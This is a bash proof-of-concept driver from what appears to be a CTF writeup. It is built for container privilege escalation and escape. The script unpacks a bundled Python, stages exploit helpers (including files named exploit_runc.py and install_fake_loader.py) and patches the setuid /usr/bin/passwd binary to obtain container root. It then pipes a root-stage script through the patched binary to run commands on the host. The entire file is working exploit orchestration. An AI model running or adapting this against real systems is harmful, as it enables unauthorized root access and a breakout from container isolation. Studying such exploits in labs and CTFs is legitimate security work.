#!/usr/bin/env bash
set -euo pipefail

# Copy this whole writeup directory to the CTF container and run:
#   ./poc.sh [host-command [args...]]

SRC_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
DCF_WORK="${DCF_WORK:-/tmp/copyfail-poc-$(id -u)}"
DCF_PYROOT="${DCF_PYROOT:-$DCF_WORK/pyroot}"
DCF_PY="${DCF_PY:-$DCF_PYROOT/bin/python3}"
DCF_PY_TARBALL="${DCF_PY_TARBALL:-$SRC_DIR/python-standalone.tar.gz}"
DCF_COPYFAIL_HELPER="${DCF_COPYFAIL_HELPER:-$DCF_WORK/copyfail_write}"
DCF_SUIDBIN="${DCF_SUIDBIN:-/usr/bin/passwd}"
DCF_HEALTHBIN="${DCF_HEALTHBIN:-/bin/sh}"
DCF_INTERVAL="${DCF_INTERVAL:-10}"
DCF_FAKE_LOADER_SLEEP="${DCF_FAKE_LOADER_SLEEP:-1}"
DCF_FAKE_LOADER_PATH="${DCF_FAKE_LOADER_PATH:-}"
DCF_HOST_CMD_TIMEOUT="${DCF_HOST_CMD_TIMEOUT:-240}"
export DCF_WORK DCF_PYROOT DCF_PY DCF_PY_TARBALL DCF_COPYFAIL_HELPER DCF_SUIDBIN
export DCF_HEALTHBIN DCF_INTERVAL DCF_FAKE_LOADER_SLEEP DCF_FAKE_LOADER_PATH DCF_HOST_CMD_TIMEOUT
export PYTHONHOME="$DCF_PYROOT"
export LD_LIBRARY_PATH="$DCF_PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export PYTHONDONTWRITEBYTECODE=1

HELPERS=(
    cf_passwd_bash.py
    copyfail_primitive.py
    copyfail_write
    cf_write.py
    cf_patch_fd_host.py
    exploit_runc.py
    install_fake_loader.py
    root_stage.sh
)

log() {
    printf '[+] %s\n' "$*"
}

die() {
    printf '[-] %s\n' "$*" >&2
    exit 1
}

bootstrap_pyroot() {
    if [[ -x "$DCF_PY" ]]; then
        return
    fi

    log "bootstrapping standalone Python in $DCF_PYROOT"
    [[ -f "$DCF_PY_TARBALL" ]] || die "missing vendored Python tarball: $DCF_PY_TARBALL"
    mkdir -p "$DCF_WORK" "$DCF_PYROOT"

    local extract_dir
    extract_dir="$DCF_WORK/python-standalone.extract"

    log "unpacking $DCF_PY_TARBALL"

    rm -rf "$DCF_PYROOT" "$extract_dir"
    mkdir -p "$DCF_PYROOT" "$extract_dir"
    tar -xzf "$DCF_PY_TARBALL" -C "$extract_dir"
    [[ -x "$extract_dir/python/bin/python3" ]] || die "unexpected Python tarball layout"
    mv "$extract_dir/python"/* "$DCF_PYROOT"/
    rm -rf "$extract_dir"

    [[ -x "$DCF_PY" ]] || die "failed to install Python under $DCF_PYROOT"
}

stage_files() {
    mkdir -p "$DCF_WORK"

    for helper in "${HELPERS[@]}"; do
        [[ -f "$SRC_DIR/$helper" ]] || die "missing helper file: $helper"
        cp "$SRC_DIR/$helper" "$DCF_WORK/$helper"
    done

    chmod 700 "$DCF_WORK"/*.py "$DCF_WORK/root_stage.sh" "$DCF_WORK/copyfail_write"
}

run_root_stage() {
    if [[ "$(id -u)" == "0" ]]; then
        log "already root; running root stage directly"
        DCF_WORK="$DCF_WORK" DCF_PYROOT="$DCF_PYROOT" DCF_PY="$DCF_PY" /bin/bash "$DCF_WORK/root_stage.sh" "$@"
        return
    fi

    log "patching $DCF_SUIDBIN to get container root"
    "$DCF_PY" "$DCF_WORK/cf_passwd_bash.py" "$DCF_SUIDBIN"

    log "launching root stage through patched $DCF_SUIDBIN"
    {
        printf 'DCF_WORK=%q\n' "$DCF_WORK"
        printf 'DCF_PYROOT=%q\n' "$DCF_PYROOT"
        printf 'DCF_PY=%q\n' "$DCF_PY"
        printf 'PYTHONHOME=%q\n' "$DCF_PYROOT"
        printf 'DCF_COPYFAIL_HELPER=%q\n' "$DCF_COPYFAIL_HELPER"
        printf 'DCF_SUIDBIN=%q\n' "$DCF_SUIDBIN"
        printf 'DCF_HEALTHBIN=%q\n' "$DCF_HEALTHBIN"
        printf 'DCF_INTERVAL=%q\n' "$DCF_INTERVAL"
        printf 'DCF_FAKE_LOADER_SLEEP=%q\n' "$DCF_FAKE_LOADER_SLEEP"
        printf 'DCF_FAKE_LOADER_PATH=%q\n' "$DCF_FAKE_LOADER_PATH"
        printf 'DCF_HOST_CMD_TIMEOUT=%q\n' "$DCF_HOST_CMD_TIMEOUT"
        printf 'set --'
        printf ' %q' "$@"
        printf '\n'
        cat "$DCF_WORK/root_stage.sh"
    } | "$DCF_SUIDBIN"
}

main() {
    bootstrap_pyroot
    stage_files
    run_root_stage "$@"
}

main "$@"
